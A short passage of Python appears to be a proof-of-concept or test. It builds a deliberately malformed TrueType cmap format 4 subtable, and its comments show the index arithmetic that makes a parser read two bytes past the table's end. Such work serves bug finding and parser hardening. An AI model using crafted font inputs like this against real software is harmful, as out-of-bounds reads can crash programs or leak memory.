    sub += be16(4)  # idRangeOffset[0]
    # glyphIdArray: 1 entry (at offset 26)
    sub += be16(1)  # glyphIdArray[0]
    # pad to length 28
    while len(sub) < length:
        sub += b'\x00'
    # Now sub is 28 bytes. glyphIdArrayLength = (28-24)/2 = 2.
    # index = 4/2 + 0 + 0 - 1 = 1. index=1 < glyphIdArrayLength=2, so reads glyphIdArray[1].
    # glyphIdArray[1] is at byte offset 26+2=28 = length. OOB read of 2 bytes.

